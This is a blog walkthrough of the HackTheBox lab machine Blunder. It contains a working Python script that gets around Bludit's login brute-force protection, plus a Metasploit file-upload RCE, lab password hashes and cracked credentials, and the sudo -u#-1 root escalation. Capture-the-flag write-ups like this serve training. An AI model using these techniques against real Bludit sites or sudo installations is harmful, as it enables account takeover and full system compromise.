---
layout: walkthrough
title: HackTheBox - Blunder
date: 2020-10-18 12:00:00 +0200
img: ChallengeVMs/HTB_Icons/blunder.png # Add image post (optional)
status: Retired
description: Hi all, My name is Kyhle Öhlinger and this blog post forms part of my personal blog. If you enjoy any of the posts, feel free to reach out and let me know :) 
---

Hi everyone, today we are going to be looking at Blunder --`10.10.10.191`-- from HackTheBox. The image below provides a high-level overview of the topics covered during this walkthrough:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Blunder/Overview.png"  style="width: 65%" />
</p>

## Information Gathering

In order to start the VM, we start with the Information gathering phase. Let's begin with a Nmap Scan.

### Nmap Output

<details>

```bat
vagrant@ko:~$ nmap -sC -sV 10.10.10.191
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-15 11:38 EDT
Nmap scan report for 10.10.10.191
Host is up (0.25s latency).
Not shown: 998 filtered ports
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 129.21 seconds

```

</details>

### Basic Web Enumeration
While browsing the web application, I ran the following scans:
* Gobuster
* Wfuzz

From the output shown above, we can see that the machine is a Linux machine, and I added `blunder.htb` to the `/etc/hosts` file. As this is a Linux machine and it only has 2 open ports, I'm going to assume that we need to start by looking at the web application. When browsing to <http://blunder.htb> we were presented with the following web page:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Blunder/img1.png"  style="width: 100%" />
</p>

Looking at the source code shows us that the content is from the Blundit framework as everything is prepended with `bl-`. Looking around, we can see that there is directory listing when browsing to `/bl-themes`, but there isn't anything really interesting in the directory. Additionally, the only allowed methods within the directory were:
* GET
* POST
* OPTIONS
* HEAD

Which was determined by running: `curl -i -X OPTIONS http://10.10.10.191/bl-themes`. Since we didn't really have much more to go on at this point, I looked into the web scanner data which is shown below:

<details>

```bat
vagrant@ko:~$ sudo gobuster dir -u http://10.10.10.191 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.191
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/08 08:09:21 Starting gobuster
===============================================================
/about (Status: 200)
/0 (Status: 200)
/admin (Status: 301)
/usb (Status: 200)
/LICENSE (Status: 200)
===============================================================
2020/09/08 09:00:13 Finished
===============================================================
```
```bat
vagrant@ko:~$ wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404,403 -u "http://10.10.10.191/FUZZ.txt" -t 100

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.191/FUZZ.txt
Total requests: 4658

===================================================================
ID           Response   Lines    Word     Chars       Payload                                          
===================================================================

000003519:   200        1 L      4 W      22 Ch       "robots"                                         
000004125:   200        4 L      23 W     118 Ch      "todo"                                           

Total time: 85.19676
Processed Requests: 4658
Filtered Requests: 4656
Requests/sec.: 54.67343
```

</details>

As you can see, there were two potentially interesting files, namely; `todo.txt` and `robots.txt`. Navigating to `todo.txt` provided us with the following information:

<details>

```bat
User-agent: *
Allow: /

todo.txt
-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING

```

</details>

From the above we now have a potential username (`fergus`) but no potential password, just yet. Lets look into the CMS! Looking through the source code, we determine that the Bludit version is 3.9.2:
<details>

```javascript

<script src="http://10.10.10.191/bl-kernel/js/jquery.min.js?version=3.9.2"></script>
<script src="http://10.10.10.191/bl-kernel/js/bootstrap.bundle.min.js?version=3.9.2"></script>
```

</details>

### Bludit Password Brute Force

Since I didn't know anything about Bludit, I went to the [Github Page](https://github.com/bludit/bludit) which describes it as:

> **Simple**, **Fast** and **Flexible** CMS.

> Bludit is a web application to build your own website or blog in seconds, it's completely free and open source.  Bludit uses files in JSON format to store the content, you don't need  to install or configure a database. You only need a web server with PHP support. Bludit is a Flat-File CMS.

From there, some basic google-fu led me to this Proof-of-Concept (PoC): <https://rastating.github.io/bludit-brute-force-mitigation-bypass/>, which describes a Brute Force mitigation bypass for versions up to and including 3.9.2:
> Versions prior to and including 3.9.2 of the Bludit CMS are vulnerable to a bypass of the anti-brute force mechanism that is in place to block users that have attempted to incorrectly login 10 times or more.

A full breakdown of the vulnerability is described in the blog post above. Alright, since we know that we can potentially brute force the password for a potential user (fergus), I decided to create a wordlist. In order to create a wordlist, I once again used the following CeWL command:

```bat
cewl http://10.10.10.191/ -m 6 -d 0 -w blunder_wordlist.lst
```

I generally sort Unique afterwards and then order by length descending -- just personal preference because if it is in the list, it most likely isn't a short number.

```bat
awk '{print length, $0}' blunder_wordlist.lst | sort -rn | cut -d ' ' -f2-> wordlist_by_length.lst
```

From there, I needed to edit the PoC code shown below:

<details>

```python
#!/usr/bin/env python3
import re
import requests

host = 'http://192.168.194.146/bludit'
login_url = host + '/admin/login'
username = 'admin'
wordlist = []

# Generate 50 incorrect passwords
for i in range(50):
    wordlist.append('Password{i}'.format(i = i))

# Add the correct password to the end of the list
wordlist.append('adminadmin')

for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print('[*] Trying: {p}'.format(p = password))

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break
```

</details>

In order to run this for our specific situation, I needed to change the random password generation to use our wordlist instead. Additionally I needed to change the URL and username fields, the basic code changes are shown below:

<details>

```python
host = 'http://10.10.10.191'
login_url = host + '/admin/login'
username = 'fergus'
file_path = '/home/vagrant/Desktop/HackTheBox/Blunder/wordlist_by_length.lst'

# Generate 50 incorrect passwords
#for i in range(50):
#    wordlist.append('Password{i}'.format(i = i))

# Add the correct password to the end of the list
#wordlist.append('adminadmin')
wordlist = [item.replace("\n", "") for item in open(file_path).readlines()]

```
</details>

Running the code gave us the following:

```bat
<-- SNIPPING -->
[*] Trying: byEgotisticalSW
[*] Trying: RolandDeschain

SUCCESS: Password found!
```

Success! We now have a password for `Fergus`: `fergus:RolandDeschain`. Using this information, we are able to log in to the web application's admin panel (`/admin`) as shown in the screenshot below:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Blunder/img2.png"  style="width: 80%" />
</p>

### Bludit Exploitation

The Bludit panel allows you to update content when navigating to the `new-content` page: <http://10.10.10.191/admin/new-content>. After enumerating the web application, I decided to look for additional vulnerabilities within the software itself. This led me to `CVE-2019-16113`:
	
> This module exploits a vulnerability in Bludit. A remote user could abuse the `uuid` parameter in the image upload feature in order to save a malicious payload anywhere onto the server, and then use a custom `.htaccess` file to bypass the file extension check to finally get remote code execution. 

Since there is a Metasploit module of this exploit, I decided to abuse the functionality that way. The image below provides the Metasploit options that I set during exploitation:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Blunder/img3.png"  style="width: 80%" />
</p>

After running the exploit, we successfully managed to get a foothold on the machine as the `www-data` user. The basic enumeration of the web user is shown below:

<details>

```bat
meterpreter > shell
Process 7449 created.
Channel 0 created.

echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";echo "id";id;echo " ";echo "ifconfig:";/sbin/ifconfig -a; echo " ";echo "groups:";groups;
 
uname -a:
Linux blunder 5.3.0-53-generic #47-Ubuntu SMP Thu May 7 12:18:16 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 
hostname:
blunder
 
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
ifconfig:
ens33: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.191  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 dead:beef::250:56ff:feb9:d710  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:d710  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:d7:10  txqueuelen 1000  (Ethernet)
        RX packets 3383844  bytes 303992404 (303.9 MB)
        RX errors 0  dropped 286  overruns 0  frame 0
        TX packets 2783805  bytes 1305642888 (1.3 GB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 35686  bytes 3158767 (3.1 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 35686  bytes 3158767 (3.1 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

 
groups:
www-data

```
</details>

## Lateral Movement using www-data

Going through the machine, I enumerated the `www` folder and realised that there were 2 different versions of Bludit: 3.9.2 & 3.10.0a on the host. Going into the respective directories `www-data@blunder:/var/www/bludit-3.9.2/bl-content/databases$` & `www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$` and reviewing the various php files showed us that the `users.php` files contained different information, specifically the `3.10.0.a` version had data for the Hugo user account, including a password hash. The `user.php` files for both versions are provided below, respectively:

<details>

```php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Admin",
        "firstName": "Administrator",
        "lastName": "",
        "role": "admin",
        "password": "bfcc887f62e36ea019e3295aafb8a3885966e265",
        "salt": "5dde2887e7aca",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""
    },
    "fergus": {
        "firstName": "",
        "lastName": "",
        "nickname": "",
        "description": "",
        "role": "author",
        "password": "be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7",
        "salt": "jqxpjfnv",
        "email": "",
        "registered": "2019-11-27 13:26:44",
        "tokenRemember": "",
        "tokenAuth": "0e8011811356c0c5bd2211cba8c50471",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "codepen": "",
        "instagram": "",
        "github": "",
        "gitlab": "",
        "linkedin": "",
        "mastodon": ""
    }
}
```
```php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}

```

</details>

### Password Cracking

As shown above, `Hugo` made use of the following password hash: `faca404fd5c0a31cf1897b823c695c85cffeb98d`.  Using Hash-Identifier in Kali, I was able to determine that the hash was most likely a SHA-1 hash. The output is provided below:

<details>

```bat

vagrant@ko:~/Desktop/HackTheBox$ hash-identifier faca404fd5c0a31cf1897b823c695c85cffeb98d
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------

Possible Hashs:
[+] SHA-1
[+] MySQL5 - SHA-1(SHA-1($pass))

Least Possible Hashs:
[+] Tiger-160
[+] Haval-160
[+] RipeMD-160
[+] SHA-1(HMAC)
[+] Tiger-160(HMAC)
[+] RipeMD-160(HMAC)
[+] Haval-160(HMAC)
[+] SHA-1(MaNGOS)
[+] SHA-1(MaNGOS2)
[+] sha1($pass.$salt)
[+] sha1($salt.$pass)
[+] sha1($salt.md5($pass))
[+] sha1($salt.md5($pass).$salt)
[+] sha1($salt.sha1($pass))
[+] sha1($salt.sha1($salt.sha1($pass)))
[+] sha1($username.$pass)
[+] sha1($username.$pass.$salt)
[+] sha1(md5($pass))
[+] sha1(md5($pass).$salt)
[+] sha1(md5(sha1($pass)))
[+] sha1(sha1($pass))
[+] sha1(sha1($pass).$salt)
[+] sha1(sha1($pass).substr($pass,0,3))
[+] sha1(sha1($salt.$pass))
[+] sha1(sha1(sha1($pass)))
[+] sha1(strtolower($username).$pass)
--------------------------------------------------


```

</details>

I put the hash into [hashtoolkit](https://hashtoolkit.com/decrypt-hash/?hash=faca404fd5c0a31cf1897b823c695c85cffeb98d) and it showed that the hash was previously identified as `Password120`. Success! Using this username, password combination, I was able to successfully authenticate to the host as Hugo:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Blunder/img4.png"  style="width: 80%" />
</p>


## Privilege Escalation

The privilege escalation aspect of this machine was quite simple. After conducting some basic user enumeration using `sudo -l`, we can see that `Hugo` is able to run `/bin/bash` based on the `!root` misconfiguration:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Blunder/img5.png"  style="width: 80%" />
</p>

The Exploit DB <https://www.exploit-db.com/exploits/47502> shows that the sudo exploit is due to the following:
> Sudo doesn't check for the existence of the specified user id and executes the with arbitrary user id with the `sudo priv -u#-1` returns as 0 which is root's id.

As shown below, `Hugo` is not able to run `sudo /bin/bash` in order to elevate privileges, however using the sudo exploit we were able to impersonate the root user:


<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Blunder/img6.png"  style="width: 80%" />
</p>

That's the box! I hope that the walkthrough helped someone. If you found it interesting at all or if you think it was missing some crucial information, please reach out to me so that I can continue improving as I create more posts.